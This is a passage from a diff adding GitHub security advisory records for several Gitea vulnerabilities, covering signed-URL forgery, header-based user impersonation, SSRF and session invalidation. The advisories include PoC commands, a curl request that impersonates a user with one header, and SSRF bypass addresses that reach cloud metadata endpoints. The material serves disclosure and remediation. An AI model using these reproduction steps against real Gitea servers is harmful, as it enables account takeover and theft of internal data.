method\nreproduced: attacker-created V4 signed URL keeps its HMAC after taskID/artifactName/artifactID rewrite\nreproduced: unauthenticated final GET returns the URL-selected target artifact instead of attacker content\nreproduced: forged UploadArtifact URL writes attacker-controlled bytes into target run/artifact staging storage and changes target artifact metadata\ncondition=attacker can run a Gitea Actions task and target task/artifact identifiers are known while target task is running\ncvss_candidate=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N\n```\n\nExample version test commands:\n\n```bash\ncd /home/kali/gitea/pocs\nGITEA_REPO=/home/kali/gitea/version-tests/gitea-v1.26.1 go run ./actions_artifact_v4_cross_task_access_dynamic_poc.go\nGITEA_REPO=/home/kali/gitea/version-tests/gitea-v1.25.5 go run ./actions_artifact_v4_cross_task_access_dynamic_poc.go\nGITEA_REPO=/home/kali/gitea/version-tests/gitea-v1.24.7 go run ./actions_artifact_v4_cross_task_access_dynamic_poc.go\nGITEA_REPO=/home/kali/gitea/version-tests/gitea-v1.23.8 go run ./actions_artifact_v4_cross_task_access_dynamic_poc.go\nGITEA_REPO=/home/kali/gitea/version-tests/gitea-v1.22.6 GITEA_TEST_GOTOOLCHAIN=go1.22.12 go run ./actions_artifact_v4_cross_task_access_dynamic_poc.go\n```\n\nSome release worktrees require a local `gitea` binary before integration tests run:\n\n```bash\ncd /path/to/gitea-release-worktree\ngo build -tags 'sqlite sqlite_unlock_notify' -o gitea .\n```\n\n### Impact\n\nThis is a cross-task and cross-repository authorization bypass in Gitea Actions artifact handling.\n\nAn attacker who can run an Actions job can obtain a valid V4 artifact signed URL for their own task, rewrite it without invalidating the HMAC, and make the server operate in another running task's context.\n\nImpacted users are Gitea instances with Actions enabled and V4 artifact signed URL handling in use. Private repositories are impacted because the forged signed URL handlers do not re-check repository access after reconstructing task context from URL parameters.\n\nConfirmed impact:\n\n- Confidentiality: read artifacts from a target running task in a private repository.\n- Integrity: write attacker-controlled artifact data into the target run/artifact staging storage and mutate target artifact metadata.\n\nThis can expose build outputs, logs or packaged artifacts stored as workflow artifacts, and can interfere with in-flight artifact upload staging. Depending on the target upload/finalization flow, it may poison artifact data consumed by later workflow steps, release automation, deployment jobs, or downstream users.\n\nRecommended fix:\n\n- Sign a canonical structured payload, such as JSON/protobuf or length-prefixed fields, instead of concatenating raw values. A versioned payload is preferable, for example `HMAC(version || canonical_payload)`.\n- Include and enforce endpoint, expiry, task ID, artifact ID, artifact name, run ID, run attempt ID, repository ID, and owner ID in the signed payload.\n- After signature verification, load the artifact by signed `artifactID`.\n- Reject the request unless the signed artifact ID, task ID, run ID, run attempt ID, repository ID, owner ID, and artifact name all match.\n- Apply artifact-name validation to V4 artifact creation as hardening.\n\nAdding separators alone is not a complete fix if the post-verification code still trusts URL fields and looks up the artifact only by name/run context. Artifact-name validation is also hardening rather than a root-cause fix, because normal valid artifact names can contain digits and separators. The important security property is binding the signed URL to one canonical artifact, task, run, repository, owner, endpoint, and expiry.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-hg5r-vq93-9fv6",
+    "source_code_location": "https://github.com/go-gitea/gitea",
+    "identifiers": [
+      {
+        "value": "GHSA-hg5r-vq93-9fv6",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-58426",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/go-gitea/gitea/security/advisories/GHSA-hg5r-vq93-9fv6",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-58426",
+      "https://github.com/go-gitea/gitea/pull/37707",
+      "https://github.com/go-gitea/gitea/commit/1c2d5e9b03f71dd12d450b2af9a79f2557b50226",
+      "https://blog.gitea.com/release-of-1.26.2",
+      "https://github.com/go-gitea/gitea/releases/tag/v1.26.2",
+      "https://github.com/advisories/GHSA-hg5r-vq93-9fv6"
+    ],
+    "published_at": "2026-07-21T20:36:38Z",
+    "updated_at": "2026-07-21T20:36:41Z",
+    "github_reviewed_at": "2026-07-21T20:36:38Z",
+    "nvd_published_at": "2026-07-03T21:17:05Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "code.gitea.io/gitea"
+        },
+        "vulnerable_version_range": ">= 1.22.0, < 1.26.2",
+        "first_patched_version": "1.26.2",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+        "score": 9.6
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-347",
+        "name": "Improper Verification of Cryptographic Signature"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "kamil-sawicki",
+          "id": 38559302,
+          "node_id": "MDQ6VXNlcjM4NTU5MzAy",
+          "avatar_url": "https://avatars.githubusercontent.com/u/38559302?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/kamil-sawicki",
+          "html_url": "https://github.com/kamil-sawicki",
+          "followers_url": "https://api.github.com/users/kamil-sawicki/followers",
+          "following_url": "https://api.github.com/users/kamil-sawicki/following{/other_user}",
+          "gists_url": "https://api.github.com/users/kamil-sawicki/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/kamil-sawicki/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/kamil-sawicki/subscriptions",
+          "organizations_url": "https://api.github.com/users/kamil-sawicki/orgs",
+          "repos_url": "https://api.github.com/users/kamil-sawicki/repos",
+          "events_url": "https://api.github.com/users/kamil-sawicki/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/kamil-sawicki/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+      "score": 9.6
+    },
+    "epss": {
+      "percentage": 0.00177,
+      "percentile": 0.07475
+    }
+  },
+  {
+    "ghsa_id": "GHSA-f75j-4cw6-rmx4",
+    "cve_id": "CVE-2026-20896",
+    "url": "https://api.github.com/advisories/GHSA-f75j-4cw6-rmx4",
+    "html_url": "https://github.com/advisories/GHSA-f75j-4cw6-rmx4",
+    "summary": "Gitea Docker image: `REVERSE_PROXY_TRUSTED_PROXIES = *` default lets any source IP impersonate any user via `X-WEBAUTH-USER`",
+    "description": "# Summary\n\nThe Gitea Docker images ship an `app.ini` template that hard-codes:\n\n```\nREVERSE_PROXY_TRUSTED_PROXIES = *\n```\n\nThe documented default for this setting, in `custom/conf/app.example.ini`, is `127.0.0.0/8,::1/128`, i.e. only loopback is trusted.\n\nWhen an admin enables `ENABLE_REVERSE_PROXY_AUTHENTICATION = true` to put Gitea behind an authenticating reverse proxy and leaves the trusted-proxies setting at \"the default\", they expect only the proxy's loopback connection to inject identity. The Docker image instead trusts `X-WEBAUTH-USER` from **any source IP** that can reach the container.\n\n## Affected\n\n- `gitea/gitea` Docker images (verified `1.26.2`)\n- `docker/root/etc/templates/app.ini:55`\n- `docker/rootless/etc/templates/app.ini:52`\n\nBinary distribution and self-built deployments that follow `app.example.ini` get the loopback-only default and are not affected.\n\n## Reproduction\n\n```\ndocker run -d --name g -p 3000:3000 \\\n  -e GITEA__service__ENABLE_REVERSE_PROXY_AUTHENTICATION=true \\\n  -e GITEA__security__INSTALL_LOCK=true \\\n  gitea/gitea:1.26.2\n\nsleep 15\ndocker exec --user git g gitea admin user create \\\n  --username alice --password \"longpasswordhere1234\" \\\n  --email alice@x.test --must-change-password=false\n\nNow the attack::\n\n\ncurl -s -L -H \"X-WEBAUTH-USER: alice\" http://localhost:3000/ \\\n  | grep -oE '<title>[^<]+</title>'\n```\n\nOutput: `<title>alice - Dashboard - Gitea: Git with a cup of tea</title>` — attacker is logged in as alice with one header, no password, no cookie.\n\nSame payload with `X-WEBAUTH-USER: <any_existing_username>` impersonates that user.\n\n## Impact\n\nAny process that can reach the Gitea container's HTTP port directly — not through the intended authenticating proxy — can impersonate any user whose login name is known or guessable. Admin accounts (`admin`, `gitea_admin`, etc.) are the obvious targets.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-f75j-4cw6-rmx4",
+    "source_code_location": "https://github.com/go-gitea/gitea",
+    "identifiers": [
+      {
+        "value": "GHSA-f75j-4cw6-rmx4",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-20896",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/go-gitea/gitea/security/advisories/GHSA-f75j-4cw6-rmx4",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-20896",
+      "https://github.com/go-gitea/gitea/pull/38151",
+      "https://github.com/go-gitea/gitea/commit/99f8b3d9a1d32f4c39828e07971455a18191e0b9",
+      "https://blog.gitea.com/release-of-1.26.3-and-1.26.4",
+      "https://github.com/go-gitea/gitea/releases/tag/v1.26.3",
+      "https://github.com/advisories/GHSA-f75j-4cw6-rmx4"
+    ],
+    "published_at": "2026-07-21T20:28:58Z",
+    "updated_at": "2026-07-21T20:28:59Z",
+    "github_reviewed_at": "2026-07-21T20:28:58Z",
+    "nvd_published_at": "2026-07-03T21:16:56Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "code.gitea.io/gitea"
+        },
+        "vulnerable_version_range": "< 1.26.3",
+        "first_patched_version": "1.26.3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-284",
+        "name": "Improper Access Control"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "rz1027",
+          "id": 53318196,
+          "node_id": "MDQ6VXNlcjUzMzE4MTk2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/53318196?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/rz1027",
+          "html_url": "https://github.com/rz1027",
+          "followers_url": "https://api.github.com/users/rz1027/followers",
+          "following_url": "https://api.github.com/users/rz1027/following{/other_user}",
+          "gists_url": "https://api.github.com/users/rz1027/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/rz1027/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/rz1027/subscriptions",
+          "organizations_url": "https://api.github.com/users/rz1027/orgs",
+          "repos_url": "https://api.github.com/users/rz1027/repos",
+          "events_url": "https://api.github.com/users/rz1027/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/rz1027/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 9.8
+    },
+    "epss": {
+      "percentage": 0.00783,
+      "percentile": 0.51576
+    }
+  },
+  {
+    "ghsa_id": "GHSA-2r5c-gw76-rh3w",
+    "cve_id": "CVE-2026-22874",
+    "url": "https://api.github.com/advisories/GHSA-2r5c-gw76-rh3w",
+    "html_url": "https://github.com/advisories/GHSA-2r5c-gw76-rh3w",
+    "summary": "Gitea: Incomplete SSRF Protection in Webhook and Migration Allow-list Default Filter",
+    "description": "## Summary\n\nGitea's default SSRF allow-list ([`MatchBuiltinExternal`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/modules/hostmatcher/hostmatcher.go#L26-L27), used by both webhook delivery and repository migrations) relies on Go's standard library [`net.IP.IsPrivate()`](https://pkg.go.dev/net#IP.IsPrivate), which only covers RFC 1918 and RFC 4193. As a result, several IP ranges commonly used for cloud metadata services, internal networks, and IPv6 transition mechanisms are not blocked, allowing authenticated users to send HTTP requests to those destinations and read the responses via the webhook history UI.\n\n## Details\n\nThe vulnerability lives in [`HostMatchList.checkIP`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/modules/hostmatcher/hostmatcher.go#L96-L114), specifically [line 103](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/modules/hostmatcher/hostmatcher.go#L103):\n\n```go\ncase MatchBuiltinExternal:\n    if ip.IsGlobalUnicast() && !ip.IsPrivate() {\n        return true\n    }\n```\n\n`net.IP.IsPrivate()` recognises only:\n- `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (RFC 1918)\n- `fc00::/7` (RFC 4193 IPv6 ULA)\n\nIt does **not** recognise:\n\n| Range | Description |\n|---|---|\n| `100.64.0.0/10` | RFC 6598 Carrier-Grade NAT |\n| `168.63.129.16/32` | Azure WireServer metadata endpoint |\n| `172.32.0.0/11` | Non-RFC1918 portion of `172.0.0.0/8` (real-world internal use) |\n| `64:ff9b::/96` | RFC 6052 IPv6 NAT64 (can embed `169.254.169.254`) |\n| `2001::/32` | RFC 4380 Teredo tunneling |\n| `2002::/16` | RFC 3056 6to4 |\n| `2001:db8::/32` | RFC 3849 documentation |\n\nThe default is reached by webhook delivery at [`services/webhook/deliver.go#L312-L316`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/services/webhook/deliver.go#L312-L316) and by repository migrations at [`services/migrations/migrate.go#L522`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/services/migrations/migrate.go#L522).\n\nThe SSRF is **not blind**. Webhook delivery captures the response status, headers, and up to 1 MiB of body ([`services/webhook/deliver.go#L259-L270`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/services/webhook/deliver.go#L259-L270)) and renders them in the webhook history UI ([`templates/repo/settings/webhook/history.tmpl#L75-L85`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/templates/repo/settings/webhook/history.tmpl#L75-L85)), so attackers can read everything the targeted internal service returns.\n\n## Impact\n\nAn authenticated user who can create or modify a webhook can:\n\n- Reach cloud metadata endpoints (AWS IMDS via NAT64 `64:ff9b::a9fe:a9fe`, Azure WireServer `168.63.129.16`)\n- Probe and exfiltrate from internal services on CGNAT (`100.64.0.0/10`) or non-RFC1918 172.x ranges\n- Read full HTTP response bodies through the webhook history UI\n\nThe same default is applied to repository migrations, broadening the attack surface to users who can trigger a migration.\n\n## Proof of Concept\n\nThe attached patch ([`gitea_ssrf_test.patch`](#patch)) adds [`TestSSRFBypassRanges`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/modules/hostmatcher/hostmatcher_test.go) to the existing test file. It uses [Go subtests](https://go.dev/blog/subtests) so each vulnerable range is its own named failing test case.\n\nRun with:\n```\ngo test -v ./modules/hostmatcher -run TestSSRFBypassRanges\n```\n\nExpected result on `4c37f4dacbac022f7beca75272439331f0368830`:\n- **8 PASS** — RFC 1918, IPv6 private ranges, and legitimate public IPs (control cases)\n- **10 FAIL** — Each failing subtest is a documented SSRF bypass\n\nSample failure output:\n```\n--- FAIL: TestSSRFBypassRanges/CGNAT_100.64.0.0/10_(RFC_6598)\n    Error: Not equal: expected: false, actual: true\n    Messages: ip=100.64.0.1\n--- FAIL: TestSSRFBypassRanges/Azure_WireServer_168.63.129.16\n    Error: Not equal: expected: false, actual: true\n    Messages: ip=168.63.129.16\n--- FAIL: TestSSRFBypassRanges/IPv6_NAT64_embedded_AWS_IMDS_169.254.169.254\n    Error: Not equal: expected: false, actual: true\n    Messages: ip=64:ff9b::a9fe:a9fe\n```\n\n## Suggested Remediation\n\nI'd suggest treating the design of [`MatchBuiltinExternal`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/modules/hostmatcher/hostmatcher.go#L96-L114) as the bug — `IsPrivate()` is too narrow a definition of \"internal.\" A comprehensive deny-list approach is what's needed here. For reference, CC-Tweaked's [`AddressPredicate.PrivatePattern`](https://github.com/cc-tweaked/CC-Tweaked/blob/3e7ce15ba6d5ab030092850f7e49829b64ba3555/projects/core/src/main/java/dan200/computercraft/core/apis/http/options/AddressPredicate.java#L116-L169) is a good reference list, blocking each of the ranges named in the table above plus a few others (multicast, broadcast, TEST-NET, etc.).\n\nThe exact remediation is at your discretion. \n\n## References\n\n- Vulnerable function: [`modules/hostmatcher/hostmatcher.go#L96-L114`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/modules/hostmatcher/hostmatcher.go#L96-L114)\n- Default for webhooks: [`services/webhook/deliver.go#L312-L316`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/services/webhook/deliver.go#L312-L316)\n- Default for migrations: [`services/migrations/migrate.go#L522`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/services/migrations/migrate.go#L522)\n- Response captured: [`services/webhook/deliver.go#L259-L270`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/services/webhook/deliver.go#L259-L270)\n- Response rendered: [`templates/repo/settings/webhook/history.tmpl#L75-L85`](https://github.com/go-gitea/gitea/blob/4c37f4dacbac022f7beca75272439331f0368830/templates/repo/settings/webhook/history.tmpl#L75-L85)\n- Go stdlib `net.IP.IsPrivate()`: <https://pkg.go.dev/net#IP.IsPrivate>\n- CC-Tweaked reference deny-list: [`AddressPredicate.java#L116-L169`](https://github.com/cc-tweaked/CC-Tweaked/blob/3e7ce15ba6d5ab030092850f7e49829b64ba3555/projects/core/src/main/java/dan200/computercraft/core/apis/http/options/AddressPredicate.java#L116-L169)\n- Go subtests pattern: <https://go.dev/blog/subtests>\n- RFC 6598 (CGNAT), RFC 6052 (NAT64), RFC 4380 (Teredo), RFC 3056 (6to4), RFC 3849 (documentation)\n\n---\n\n## Patch <a name=\"patch\"></a>\n\nProposed `gitea_ssrf_test.patch`:\n\n```diff\ndiff --git a/modules/hostmatcher/hostmatcher_test.go b/modules/hostmatcher/hostmatcher_test.go\nindex c781847..0b39e60 100644\n--- a/modules/hostmatcher/hostmatcher_test.go\n+++ b/modules/hostmatcher/hostmatcher_test.go\n@@ -159,3 +159,56 @@ func TestHostOrIPMatchesList(t *testing.T) {\n \t}\n \ttest(cases)\n }\n+\n+// TestSSRFBypassRanges verifies that the \"external\" filter (the default used by\n+// webhook delivery and repository migrations) blocks dangerous IP ranges.\n+//\n+// Each subtest's `allowed` field is the expected return value of MatchHostOrIP:\n+//   - false: the IP should be blocked (rejected by the filter)\n+//   - true:  the IP should be allowed (a legitimate public destination)\n+//\n+// Subtests that FAIL are documented SSRF bypasses: IP ranges that should be\n+// blocked but are incorrectly allowed because the underlying check relies on\n+// net.IP.IsPrivate(), which only covers RFC 1918 and RFC 4193.\n+func TestSSRFBypassRanges(t *testing.T) {\n+\ttype tc struct {\n+\t\tip      net.IP\n+\t\tallowed bool\n+\t}\n+\n+\thl := ParseHostMatchList(\"\", \"external\")\n+\n+\tcases := map[string]tc{\n+\t\t// RFC 1918 / IPv6 private ranges - correctly blocked\n+\t\t\"RFC1918 10.0.0.0/8\":        {net.ParseIP(\"10.0.0.1\"), false},\n+\t\t\"RFC1918 172.16.0.0/12\":     {net.ParseIP(\"172.16.0.1\"), false},\n+\t\t\"RFC1918 192.168.0.0/16\":    {net.ParseIP(\"192.168.1.1\"), false},\n+\t\t\"IPv6 loopback ::1\":         {net.ParseIP(\"::1\"), false},\n+\t\t\"IPv6 link-local fe80::/10\": {net.ParseIP(\"fe80::1\"), false},\n+\t\t\"IPv6 ULA fd00::/8\":         {net.ParseIP(\"fd00::1\"), false},\n+\n+\t\t// Legitimate public IPs - correctly allowed\n+\t\t\"Public IPv4 (Google DNS)\": {net.ParseIP(\"8.8.8.8\"), true},\n+\t\t\"Public IPv6 (Google DNS)\": {net.ParseIP(\"2001:4860:4860::8888\"), true},\n+\n+\t\t// SSRF bypasses - the assertions below intentionally describe the\n+\t\t// expected secure behavior (allowed=false). Each failing subtest is\n+\t\t// a documented bypass.\n+\t\t\"CGNAT 100.64.0.0/10 (RFC 6598)\":              {net.ParseIP(\"100.64.0.1\"), false},\n+\t\t\"CGNAT 100.127.255.254 (RFC 6598)\":            {net.ParseIP(\"100.127.255.254\"), false},\n+\t\t\"Azure WireServer 168.63.129.16\":              {net.ParseIP(\"168.63.129.16\"), false},\n+\t\t\"Non-RFC1918 172.32.0.0/11\":                   {net.ParseIP(\"172.32.0.1\"), false},\n+\t\t\"Non-RFC1918 172.45.0.0/16\":                   {net.ParseIP(\"172.45.0.1\"), false},\n+\t\t\"IPv6 NAT64 64:ff9b::/96 (RFC 6052)\":          {net.ParseIP(\"64:ff9b::1\"), false},\n+\t\t\"IPv6 NAT64 embedded AWS IMDS 169.254.169.254\": {net.ParseIP(\"64:ff9b::a9fe:a9fe\"), false},\n+\t\t\"IPv6 Teredo 2001::/32 (RFC 4380)\":            {net.ParseIP(\"2001::1\"), false},\n+\t\t\"IPv6 6to4 2002::/16 (RFC 3056)\":              {net.ParseIP(\"2002::1\"), false},\n+\t\t\"IPv6 documentation 2001:db8::/32 (RFC 3849)\": {net.ParseIP(\"2001:db8::1\"), false},\n+\t}\n+\n+\tfor name, c := range cases {\n+\t\tt.Run(name, func(t *testing.T) {\n+\t\t\tassert.Equalf(t, c.allowed, hl.MatchHostOrIP(\"\", c.ip), \"ip=%v\", c.ip)\n+\t\t})\n+\t}\n+}\n```\n\n## Credit\n\nThis vulnerability was uncovered by @JLLeitschuh of the @braze-inc security team.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-2r5c-gw76-rh3w",
+    "source_code_location": "https://github.com/go-gitea/gitea",
+    "identifiers": [
+      {
+        "value": "GHSA-2r5c-gw76-rh3w",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-22874",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/go-gitea/gitea/security/advisories/GHSA-2r5c-gw76-rh3w",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-22874",
+      "https://github.com/go-gitea/gitea/pull/38059",
+      "https://github.com/go-gitea/gitea/pull/38173",
+      "https://blog.gitea.com/release-of-1.26.3-and-1.26.4",
+      "https://github.com/go-gitea/gitea/releases/tag/v1.26.3",
+      "https://github.com/advisories/GHSA-2r5c-gw76-rh3w"
+    ],
+    "published_at": "2026-07-21T20:27:17Z",
+    "updated_at": "2026-07-21T20:27:17Z",
+    "github_reviewed_at": "2026-07-21T20:27:17Z",
+    "nvd_published_at": "2026-07-03T21:16:57Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "code.gitea.io/gitea"
+        },
+        "vulnerable_version_range": "< 1.26.3",
+        "first_patched_version": "1.26.3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+        "score": 9.6
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-918",
+        "name": "Server-Side Request Forgery (SSRF)"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "JLLeitschuh",
+          "id": 1323708,
+          "node_id": "MDQ6VXNlcjEzMjM3MDg=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/1323708?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/JLLeitschuh",
+          "html_url": "https://github.com/JLLeitschuh",
+          "followers_url": "https://api.github.com/users/JLLeitschuh/followers",
+          "following_url": "https://api.github.com/users/JLLeitschuh/following{/other_user}",
+          "gists_url": "https://api.github.com/users/JLLeitschuh/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/JLLeitschuh/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/JLLeitschuh/subscriptions",
+          "organizations_url": "https://api.github.com/users/JLLeitschuh/orgs",
+          "repos_url": "https://api.github.com/users/JLLeitschuh/repos",
+          "events_url": "https://api.github.com/users/JLLeitschuh/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/JLLeitschuh/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "M8seven",
+          "id": 254332705,
+          "node_id": "U_kgDODyjPIQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/254332705?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/M8seven",
+          "html_url": "https://github.com/M8seven",
+          "followers_url": "https://api.github.com/users/M8seven/followers",
+          "following_url": "https://api.github.com/users/M8seven/following{/other_user}",
+          "gists_url": "https://api.github.com/users/M8seven/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/M8seven/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/M8seven/subscriptions",
+          "organizations_url": "https://api.github.com/users/M8seven/orgs",
+          "repos_url": "https://api.github.com/users/M8seven/repos",
+          "events_url": "https://api.github.com/users/M8seven/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/M8seven/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "other"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+      "score": 9.6
+    },
+    "epss": {
+      "percentage": 0.00464,
+      "percentile": 0.36938
+    }
+  },
+  {
+    "ghsa_id": "GHSA-rgv6-xp99-6mgj",
+    "cve_id": "CVE-2026-56750",
+    "url": "https://api.github.com/advisories/GHSA-rgv6-xp99-6mgj",
+    "html_url": "https://github.com/advisories/GHSA-rgv6-xp99-6mgj",
+    "summary": "Gitea Remember-Me Token Theft Not Invalidating Attacker Session",
+    "description": "The vulnerability is in the Remember-Me (gitea_incredible) token validation logic, specifically when handling a compromised token (hash mismatch).\n\nThe vulnerable function is this one:\n\nhttps://github.com/go-gitea/gitea/blob/689ace1ce28fd74244b8aa335d9928cdbf6b22f9/services/auth/auth_token.go#L33-L64\n\n### Affected Endpoint\nPOST `/user/login` (and any endpoint triggering `autoSignIn` via the Remember-Me cookie).\n\n### Description\nGitea implements Remember-Me cookies using a split token design (ID:Hash), [citing the Paragonie secure remember-me guide](https://github.com/go-gitea/gitea/blob/689ace1ce28fd74244b8aa335d9928cdbf6b22f9/services/auth/auth_token.go#L21). When a token is used, its Hash is rotated, but the ID remains the same.\n\nIf an attacker steals a user's Remember-Me token and uses it to authenticate, the attacker is issued a new rotated token (same ID, new Hash). When the legitimate user later attempts to use their original token, Gitea correctly detects a hash mismatch for the given ID.\n\nAccording to the referenced Paragonie specification, this indicates a compromised token, and ALL active remember-me sessions for that user MUST be invalidated. However, Gitea's `CheckAuthToken` function simply returns `ErrAuthTokenInvalidHash`. The calling code (`autoSignIn`) catches this error and deletes the victim's local cookie via `ctx.DeleteSiteCookie`, but fails to delete the compromised token from the database.\n\nAs a result, the attacker's active session is never invalidated, and the attacker maintains persistent, indefinite access to the victim's account, entirely defeating the purpose of the split-token security design.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-rgv6-xp99-6mgj",
+    "source_code_location": "https://github.com/go-gitea/gitea",
+    "identifiers": [
+      {
+        "value": "GHSA-rgv6-xp99-6mgj",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-56750",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/go-gitea/gitea/security/advisories/GHSA-rgv6-xp99-6mgj",
+      "https://github.com/go-gitea/gitea/pull/38406",
+      "https://github.com/go-gitea/gitea/pull/38426",
+      "https://github.com/go-gitea/gitea/commit/de4b8277e9cb576f2315fb03b5ab6478b42a1d31",
+      "https://github.com/go-gitea/gitea/commit/f69e15afe7496cc62e96dab244629c69eb31a7bf",
+      "https://github.com/go-gitea/gitea/releases/tag/v1.27.0",
+      "https://github.com/advisories/GHSA-rgv6-xp99-6mgj"
+    ],
+    "published_at": "2026-07-21T20:20:21Z",
+    "updated_at": "2026-07-21T20:20:23Z",
+    "github_reviewed_at": "2026-07-21T20:20:21Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "code.gitea.io/gitea"
+        },
+        "vulnerable_version_range": "< 1.27.0",
+        "first_patched_version": "1.27.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+        "score": 9.1
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-613",
+        "name": "Insufficient Session Expiration"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "AdamKorcz",
+          "id": 44787359,
+          "node_id": "MDQ6VXNlcjQ0Nzg3MzU5",
+          "avatar_url": "https://avatars.githubusercontent.com/u/44787359?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/AdamKorcz",
+          "html_url": "https://github.com/AdamKorcz",
